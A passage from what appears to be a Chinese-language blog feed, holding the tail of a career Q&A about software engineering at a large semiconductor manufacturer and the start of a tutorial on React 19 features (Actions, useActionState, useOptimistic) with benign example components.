QPS 破萬的架構，這些技術與工具的選擇並不重要，真正關鍵的是能在有限的資源內學習，並找到解決方案。</p><h3 id="提升曝光度"><a href="#提升曝光度" class="headerlink" title="提升曝光度?"></a>提升曝光度?</h3><p>怎樣比較容易被主管撈到履歷?要被撈到需要磨練哪方面的技能呢?</p><p>另一種方式是讓老闆直接找到你，這樣人資會主動協助安排面試。</p><p>透過作品集或個人品牌，增加讓別人了解你的管道，也可以好好經營 104 的個人品牌頁面。</p><p>我能有今天的分享機會，也是因為我的資料被人搜尋到。</p><h2 id="公司與職場文化"><a href="#公司與職場文化" class="headerlink" title="公司與職場文化"></a>公司與職場文化</h2><p>內部文化或風氣，可以參考<a href="https://linyencheng.github.io/2025/06/01/monkeys-on-the-mountain/from-starting-to-giving-up-from-doing-to-talking/">山上猴子的故事</a>系列文章？</p><h3 id="公司文化"><a href="#公司文化" class="headerlink" title="公司文化"></a>公司文化</h3><p>公司文化會影響到工作的環境，尤其是關於透明度、價值觀以及組織的合作模式。</p><p>實際上還是製造為主的工廠，軟體是協助研發製造的一種工具。</p><h3 id="職場文化"><a href="#職場文化" class="headerlink" title="職場文化"></a>職場文化</h3><p>內部 “文化” 或 “風氣”?</p><p>職場文化的差異可能會影響到你在工作的態度，與同事的協作及對公司的忠誠。</p><p>簡而言之會是信任度的培養，在低度信任的情況下就是互相 HL 對方。</p><p>有歷史的老公司，分成老一代跟新生代兩類人，早期不被鼓勵找有工作經驗的新進同仁，絕大部分都是從畢業開始一路待，少數是離開後回鍋的。</p><h3 id="互動情境"><a href="#互動情境" class="headerlink" title="互動情境"></a>互動情境</h3><p>公司人數龐大，因此不同部門的互動情況差異很大。但以內部生態來說，食物鏈的層級，直接會影響你工作的心情。</p><h3 id="Mentor-制度"><a href="#Mentor-制度" class="headerlink" title="Mentor 制度"></a>Mentor 制度</h3><p>公司內部的 Mentor 制度能幫助新員工更快地融入環境，並且在工作中得到更多的指導與支持。</p><p>每位新人進入公司時，會分配一位 Buddy 或 Mentor，取決於你是否適應工作環境。</p><p>公司比較大，需要注意的事項很多，如果直接讓新人獨立工作，可能很快就會離職。</p><h3 id="心態與挑戰"><a href="#心態與挑戰" class="headerlink" title="心態與挑戰"></a>心態與挑戰</h3><p>有人的地方有政治，有政治的地方就有內耗，更何況是上千人的單位。這是一個難以避免的現象。尤其在員工數量眾多的情況下，溝通就變得尤為重要。花最多時間會是溝通。</p><blockquote><p>樹大必有枯枝，人多呢則不好說，前輩留下滿滿的愛心總是會讓你有機會成長。</p></blockquote><h3 id="最有挑戰性的問題"><a href="#最有挑戰性的問題" class="headerlink" title="最有挑戰性的問題?"></a>最有挑戰性的問題?</h3><p>遇過最大的挑戰?如何面對及處理?</p><p>在半導體產業，挑戰性的問題包括如何提高製程精度、減少缺陷率、提升生產效率等。這些問題通常需要跨領域的合作與創新思維，並且不斷學習最新的技術來解決。</p><p>在跨國工廠中，最具挑戰性的部分是能夠體驗全球化的運作模式。會遇到各種不同的架構與問題，需要處理不少預料之外的困難。</p><h3 id="工廠需要的人才類型"><a href="#工廠需要的人才類型" class="headerlink" title="工廠需要的人才類型?"></a>工廠需要的人才類型?</h3><p>加入貴公司需要具備什麼技術?需要什麼背景、技能?讀財務及軟體有地方讓我發揮嗎?文組還能夠擔任什麼職務?適合什麼樣”人格特質”的人進去?</p><p>工廠通常需要具備專業技能且能夠適應工廠環境且服從的員工，金字塔遠看高大上，實際上是搬磚的累積。</p><p>要有能力解決老闆燃眉之急的問題，可能是新專案或是舊專案改寫。</p><p>大多是原來內部人員短時間無法快速做好的，簡單做又有 credit 怎麼會輪到你？💕</p><p>背景要看是人脈的背景或能力的背景?</p><h3 id="英文重要嗎"><a href="#英文重要嗎" class="headerlink" title="英文重要嗎"></a>英文重要嗎</h3><p>Does TSMC accept foreign student that graduated here in Taiwan?</p><p>現在同事蠻多外國人的，也非常需要懂英文、日文的人才。有些部門會需要應對外國人，英文沒有很好沒關係但至少打字或簡單聊天還是需要的。</p><h3 id="需要值班嗎"><a href="#需要值班嗎" class="headerlink" title="需要值班嗎?"></a>需要值班嗎?</h3><p>工廠是以製造為主，需要大量工人來確保機械的穩定運作。在這樣的環境下，你必須能夠配合產線的作息，隨時準備好進行工作。即使是出去玩，也有可能需要帶上電腦，隨時與同事進行協調。</p><h2 id="工作上會使用哪些技術和工具？"><a href="#工作上會使用哪些技術和工具？" class="headerlink" title="工作上會使用哪些技術和工具？"></a>工作上會使用哪些技術和工具？</h2><p>在工廠進行 AI 應用與數位轉型的過程中，軟體工程師依照工作本質的分類，會依照不同處的需求所以會有不同的工具選型，因為這樣所以需要的技能也都不太一樣，依照權責也分成中央的 IT 還有各部門的 IT。</p><p>在工廠的軟體工程師，依照工作的職能用到的程式語言從 c++ vb JavaScript Java kotlin dart 都有，主要是幫各部門處理任何你能想像出來的需求。</p><p>畢竟是屬於 support 的成本單位，不同單位不同製程都有不同的 work flow 需要客製跟權限卡控，詳細資訊可以參考底下網站。</p><blockquote><p>康威定律，組織越多需要特製的系統就越多</p></blockquote><p>主要是幫各部門處理雜事？畢竟是屬於 support 的成本單位，不同單位不同製程都有不同的 work flow 需要客製跟權限卡控，詳細資訊可以參考底下網站。</p><blockquote><p>靠新手訓練營統一專業技能，台積電將雲端原生技術變成 IT 必備基礎<br><a href="https://www.ithome.com.tw/news/149127">https://www.ithome.com.tw/news/149127</a></p></blockquote><h3 id="對外部"><a href="#對外部" class="headerlink" title="對外部"></a>對外部</h3><p>對外部需求的處理通常要精通前端、後端等技術，熟悉主流開發框架。</p><p>使用的包括：Node.js、React、Java、Python、Docker、Kubernetes 等。</p><h3 id="對產線"><a href="#對產線" class="headerlink" title="對產線"></a>對產線</h3><p>對產線相關工作，主要會專注在產線相關的資料處理，主要是撰寫後端去和產線上原有的 SiView 系統進行互動。</p><p>此外要更熟悉如傳統的 VB、SQL 操作，以及甲骨文或是 DB2 等各種類型的資料庫，用於監控與資料分析，蠻重視對於資料的操作正確性。</p><h3 id="AI-應用"><a href="#AI-應用" class="headerlink" title="AI 應用"></a>AI 應用</h3><p>內部預算緊縮如何說服長官提供資源？有部署內部的LLM嗎？是否有開發RAG、Agent應用？網管資安政策限制下怎麼獲取數據？</p><p>AI 正在各行各業廣泛應用，尤其在自動化、預測分析等發揮巨大作用。</p><p>工程師可能會參與：<br>－運用計算機視覺做量測自動化<br>－機器學習生成實驗參數<br>－聊天機器人回答常見問題</p><h3 id="內部相關基礎建設-DevOps"><a href="#內部相關基礎建設-DevOps" class="headerlink" title="內部相關基礎建設 (DevOps)"></a>內部相關基礎建設 (DevOps)</h3><p>對於內部基礎建設，DevOps 是當前企業 IT 運營的關鍵。</p><p>DevOps 實踐涉及持續集成、持續部署、自動化測試等，並通過使用 CI&#x2F;CD 工具、版本控制工具等，提升整體開發運營效率。</p><p>也是有只負責辦公室工具軟體的部門，就是大家想像中的 MIS。</p><h2 id="半導體產業工程師職涯"><a href="#半導體產業工程師職涯" class="headerlink" title="半導體產業工程師職涯"></a>半導體產業工程師職涯</h2><h3 id="轉職或是內部輪調"><a href="#轉職或是內部輪調" class="headerlink" title="轉職或是內部輪調?"></a>轉職或是內部輪調?</h3><p>對於工程師來說，轉職與內部輪調是常見的選擇。</p><p>轉職讓工程師拓展技術領域，而內部輪調可幫助擴大對公司運營的了解，進一步提升職涯發展的深度與廣度。</p><p>部門調動要維持穩定的考績，表現穩定者更具轉換優勢。</p><h3 id="外派的機會"><a href="#外派的機會" class="headerlink" title="外派的機會"></a>外派的機會</h3><p>想了解外派機會?有機會去日本或美國嗎?</p><p>外派機會通常對於有特殊技能或高經驗的工程師開放。</p><p>如果能夠自願外派，更是加分，畢竟，拯救台灣、賺取外匯的重任，將由各位大大來承擔。</p><p>川普即將翻開小孩無效卡?!</p><h3 id="可以遠端工作嗎"><a href="#可以遠端工作嗎" class="headerlink" title="可以遠端工作嗎?"></a>可以遠端工作嗎?</h3><p>疫情期間，處理的業務機密等級不高的時候可以遠端工作。</p><p>在工廠工作時，原則上遠端工作不太可能，除非有特殊需求，例如陪產或需要照顧生病的家人等情況。</p><p>自願天天值班就可以天天在家工作。</p><h3 id="新專案多還是維護舊專案多呢"><a href="#新專案多還是維護舊專案多呢" class="headerlink" title="新專案多還是維護舊專案多呢?"></a>新專案多還是維護舊專案多呢?</h3><p>如果你在一家有歷史的工廠工作，專案的時間跨度可能會非常長。</p><p>有些系統可能非常陳舊，但也有些架構被新進員工認為過於前衛，在這樣的公司上班你需要學會和危樓共存，也需要學習建立摩天大樓。</p><blockquote><p>康威定律: 隨著組織的發展，舊的專案不僅不能拋棄還會推陳出新許多新的專案</p></blockquote><h2 id="工作上的體驗"><a href="#工作上的體驗" class="headerlink" title="工作上的體驗"></a>工作上的體驗</h2><h3 id="學習資源多嗎-是否有補助呢"><a href="#學習資源多嗎-是否有補助呢" class="headerlink" title="學習資源多嗎? 是否有補助呢?"></a>學習資源多嗎? 是否有補助呢?</h3><p>請問工作後能夠繼續深造?學習新技能嗎?</p><p>學習資源豐富與否取決於公司政策與部門文化。大部分公司會提供一些內部或外部的學習資源，並可能會提供補助或津貼以鼓勵員工進行自我提升。</p><p>大公司的學習資源通常相對較多，前提是你有足夠的時間來充分利用這些資源，公司額外提供達到考績標準的同仁申請在職進修補助。</p><h3 id="辦公室氣氛"><a href="#辦公室氣氛" class="headerlink" title="辦公室氣氛"></a>辦公室氣氛</h3><p>工作氣氛,是否高壓或有霸凌現象?待過的部門氣氛如何?和同事與主管相處的氛圍如何?</p><p>辦公室的氣氛通常取決於公司的文化與團隊氛圍。良好的氣氛有助於員工的工作積極性和創造力，也能促進團隊的合作與溝通。</p><p>台北辦公室的環境據說與外商公司相似，雖然我自己沒有親身經歷過，但近期公司確實有舉辦一些講座，歡迎大家報名參加。</p><h3 id="工程師的一天會是怎麼樣子"><a href="#工程師的一天會是怎麼樣子" class="headerlink" title="工程師的一天會是怎麼樣子?"></a>工程師的一天會是怎麼樣子?</h3><p>在大公司的日常工作流程中，會議是不可或缺的一部分，尤其是在團隊人數較多的情況下，會議常常成為同步訊息的主要方式。</p><p>近年來，公司也開始聘請敏捷教練或 Scrum Master 來輔導團隊，提升工作效率與協作模式。開發流程會依照看板、Scrum 或是 Deadline Driven 的 DDD，會議是同步訊息的主要方式。</p><p>在工廠工作的工程師日常：</p><ol><li>常常會被使用系統的單位 HL</li><li>影響產線的時候需要馬上解決</li><li>被質疑系統有問題造成 MO</li><li>被抱怨系統難以操作和使用</li></ol><h3 id="怎麼適應高壓的工作"><a href="#怎麼適應高壓的工作" class="headerlink" title="怎麼適應高壓的工作?"></a>怎麼適應高壓的工作?</h3><p>在於高壓環境，如何熟悉工作內容?屬於高壓的工作環境嗎?</p><p>高壓的工作需要良好的時間管理與壓力管理能力。學會設置優先級，合理分配工作，並且及時調整自己的心態，這樣能夠在壓力下保持高效的工作狀態。</p><p>大家可能會好奇，在高壓的工作環境下，如何快速熟悉工作內容？有時候可能需要賣萌、加班，或是調高自己的羞恥心來適應這種工作節奏。</p><h3 id="AI-的幫助"><a href="#AI-的幫助" class="headerlink" title="AI 的幫助?"></a>AI 的幫助?</h3><p>AI 對於產業未來的影響是什麼?AI 應用上是否有重要計畫?AI 時代下，對軟體工程師的建議?是否有 AI 相關的職缺?裡面可以使用 AI 工具嗎?</p><p>AI 技術在許多領域提供了極大的幫助，從自動化作業到數據分析，AI 不僅能提高工作效率，還能提供更多創新的解決方案，減少人工錯誤。</p><p>目前來看，公司希望在不影響廠房運作的前提下，盡量避免過多的干預。有些系統仍然維持在比較傳統的架構下，整合與翻新並不容易。但還是會有一些創新的應用像是把將一些資料透過 AR&#x2F;VR 視覺化，幫助技術與操作的理解和模擬。</p><h3 id="台商與外商的選擇"><a href="#台商與外商的選擇" class="headerlink" title="台商與外商的選擇?"></a>台商與外商的選擇?</h3><p>那麼在半導體產業和外商公司之間該如何選擇呢？如果有選擇的機會，當然是選擇外商，這點其實不需要猶豫。</p><h3 id="是否需要加班呢"><a href="#是否需要加班呢" class="headerlink" title="是否需要加班呢?"></a>是否需要加班呢?</h3><p>加班的情況取決於專案的需求與工作進度。若專案較為緊迫，可能需要加班完成任務。</p><p>許多公司也有彈性工時政策，讓員工在不影響工作進度的情況下更好地平衡工作與生活。</p><p>至於工作中是否經常需要加班？加班的頻率基本上是個人選擇，取決於你的工作態度與需求，個人是蠻支持新一代（00後）來整頓職場環境的。</p><!-- 半導體產業的工程師分類與各自負責的項目大致為何？無半導體相關知識可以進入嗎？台積電IT維護舊系統多還是開發新專案多呢？原先非相關產業背景的有機會進入台積電做工程師嗎？C# 工程師有機會進入台積電嗎？化工系同學有辦法加入tsmc 嗎？半導體產業的相關職務？需要的相關技術？台積電和其他半導體產業最大的區別是什麼？AI對於產業未來的影響是什麼？想請問如何面試上設備工程師是否有管理培訓計劃給有經驗的候選人？輝達的新電腦有研究嗎？台積電適合做到退休嗎？台積電海外廠（如：德國廠、熊本廠）人員招攬條件與資格？研發替代役的簽約金要在特殊的時間點面試才有，以前如果是簽約金，會依照學校的世界排名還有你的面試當下地點 --><h3 id="需要值班嗎-1"><a href="#需要值班嗎-1" class="headerlink" title="需要值班嗎?"></a>需要值班嗎?</h3><p>是不是每個職位都需要輪班與值班嗎？</p><p>有些工作需要定期值班或輪班，這取決於公司的運作模式與需求。</p><p>工廠是以製造為主，需要大量工人來確保機械的穩定運作。</p><p>在這樣的環境，必須能夠配合產線的作息，隨時準備好進行工作。</p><p>即使是出去玩，也有可能需要帶上電腦，隨時與同事進行協調。</p><h3 id="升遷考核"><a href="#升遷考核" class="headerlink" title="升遷考核"></a>升遷考核</h3><p>升遷問題?升遷制度為何?內部的升遷及考核制度?</p><p>升遷考核主要依賴個人的表現、貢獻以及是否能夠處理更高層次的工作與挑戰。</p><p>目前公司每年會進行一次考核，根據職等有所不同。</p><p>缺乏升遷機會的人，進修 PHD 或是藉由跳槽後再回鍋，可能成為更快的晉升途徑。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 19 集氣兩年華麗登場</title>
      <link href="/2024/12/14/react/react-v19-introduction/"/>
      <url>/2024/12/14/react/react-v19-introduction/</url>
      
        <content type="html"><![CDATA[<p>餓死抬頭，React 19 究竟是繼 v18 睽違兩年華麗登場?! 還是十年走來始終如一?! 相對於 Angular 每次升級每次 Breaking Change，這次的 React 19 更新看起來不僅不想拖過年，也把 Nextjs Canary 許久的 Server Component 穩定版進行釋出。</p><p>一如既往的可以無痛升級，這次升級雖然也有一些必要改變，但也提早在 v18 的小版本釋出中提出警告，基於 v18 穩定和表現基礎上實現了多項重大功能提升和優化，接近兩年的蟄伏究竟帶來了什麼改變?!</p><p>React 19 不僅僅是版本更新，而是對開發者體驗和應用性能的全方位升級。React 19 引入了全新的 API 和 Hooks，改善了 React 內部多個機制，讓開發者能夠更高效地構建現代 Web 應用。</p><p>接下來一起來從實際開發者體驗的角度，介紹 React 19 中幾個關鍵新特性，並解釋它們如何簡化開發流程和提升應用效能。</p><h2 id="React-19-Server-Component"><a href="#React-19-Server-Component" class="headerlink" title="React 19 Server Component"></a>React 19 Server Component</h2><p>目前看起來雖然穩定，但絕大多數工具跟框架都尚未完全整合和支援，小編認為這一版可以看成 Server Component 提前準備，像是</p><ul><li>Actions 提供了 Client 跟 Server 都支援的寫法</li><li>內建支援使用 Meta Data</li><li>完整支援 web component</li></ul><h2 id="React-19-Actions"><a href="#React-19-Actions" class="headerlink" title="React 19 Actions"></a>React 19 Actions</h2><p>React 19 介紹了 Actions 的概念，取代了使用事件處理器，並與 React transitions 和 concurrent features 整合。</p><p>Actions 可以在客戶端和伺服器端使用，例如可以使用 Client Action 來替代之前的 onSubmit 事件處理器來處理表單，使用 Action 時不需要解析事件，Action 會直接接收 FormData。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">TodoApp</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [items, setItems] = <span class="title function_">useState</span>([&#123; <span class="attr">text</span>: <span class="string">&quot;我的第一個待辦事項&quot;</span> &#125;]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">formAction</span>(<span class="params">formData</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> newItem = formData.<span class="title function_">get</span>(<span class="string">&quot;item&quot;</span>);</span><br><span class="line">    <span class="comment">// 可以向伺服器發送 POST 請求來儲存新項目</span></span><br><span class="line">    <span class="title function_">setItems</span>(<span class="function">(<span class="params">items</span>) =&gt;</span> [...items, &#123; <span class="attr">text</span>: newItem &#125;]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>待辦清單<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;formAction&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;item&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;新增待辦...&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;items.map((item, index) =&gt; (</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span>&#123;item.text&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ))&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="useActionState：非同步狀態管理"><a href="#useActionState：非同步狀態管理" class="headerlink" title="useActionState：非同步狀態管理"></a>useActionState：非同步狀態管理</h3><p>React 19 中加入了 useActionState Hook 簡化程式碼，專門用來簡化非同步資料處理和狀態管理，開發者不再需要手動追蹤請求狀態、錯誤信息或更新順序，Actions 提供自動管理的待處理狀態，當請求開始時 <code>isPending </code> 會設置為 true，並在最終更新後自動重置。</p><p>例如當用戶提交表單時，React 19 可以自動管理 API 請求的等待狀態和錯誤處理，這使得開發者能更專注於業務邏輯，而不必關心繁瑣的狀態管理細節。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 Actions 的待處理狀態</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">UpdateName</span>(<span class="params">&#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [name, setName] = <span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> [error, setError] = <span class="title function_">useState</span>(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> [isPending, startTransition] = <span class="title function_">useTransition</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleSubmit</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">startTransition</span>(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> error = <span class="keyword">await</span> <span class="title function_">updateName</span>(name);</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="title function_">setError</span>(error);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">redirect</span>(<span class="string">&quot;/path&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&#123;name&#125;</span> <span class="attr">onChange</span>=<span class="string">&#123;(event)</span> =&gt;</span> setName(event.target.value)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleSubmit&#125;</span> <span class="attr">disabled</span>=<span class="string">&#123;isPending&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        更新</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;error &amp;&amp; <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;error&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 &lt;form&gt; Actions 和 useActionState</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ChangeName</span>(<span class="params">&#123; name, setName &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [error, submitAction, isPending] = <span class="title function_">useActionState</span>(</span><br><span class="line">    <span class="title function_">async</span> (previousState, formData) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> error = <span class="keyword">await</span> <span class="title function_">updateName</span>(formData.<span class="title function_">get</span>(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">      <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">redirect</span>(<span class="string">&quot;/path&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="literal">null</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;submitAction&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">disabled</span>=<span class="string">&#123;isPending&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        更新</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;error &amp;&amp; <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;error&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="useOptimistic：提升用戶體驗"><a href="#useOptimistic：提升用戶體驗" class="headerlink" title="useOptimistic：提升用戶體驗"></a>useOptimistic：提升用戶體驗</h3><p>React 19 引入了 useOptimistic Hook，通過實現樂觀更新來提升應用的響應速度。用戶送出請求後，應用會立刻顯示預期結果，並在後端回應後進行最終更新而減少等待時間。</p><ul><li>如果成功，會直接用新的 state 覆蓋預期結果</li><li>如果失敗，會直接取消 UI 的更新</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ChangeName</span>(<span class="params">&#123; currentName, onUpdateName &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [optimisticName, setOptimisticName] = <span class="title function_">useOptimistic</span>(currentName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">submitAction</span> = <span class="keyword">async</span> (<span class="params">formData</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> newName = formData.<span class="title function_">get</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="title function_">setOptimisticName</span>(newName);</span><br><span class="line">    <span class="keyword">const</span> updatedName = <span class="keyword">await</span> <span class="title function_">updateName</span>(newName);</span><br><span class="line">    <span class="title function_">onUpdateName</span>(updatedName);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;submitAction&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your name is: &#123;optimisticName&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Change Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">name</span>=<span class="string">&quot;name&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">disabled</span>=<span class="string">&#123;currentName</span> !== <span class="string">optimisticName&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="use-API：輕鬆讀取資源"><a href="#use-API：輕鬆讀取資源" class="headerlink" title="use API：輕鬆讀取資源"></a>use API：輕鬆讀取資源</h3><p>React 19 引入的 use API 讓開發者能夠在渲染過程中直接讀取非同步資源（如 Promise 或 Context），並且由 React 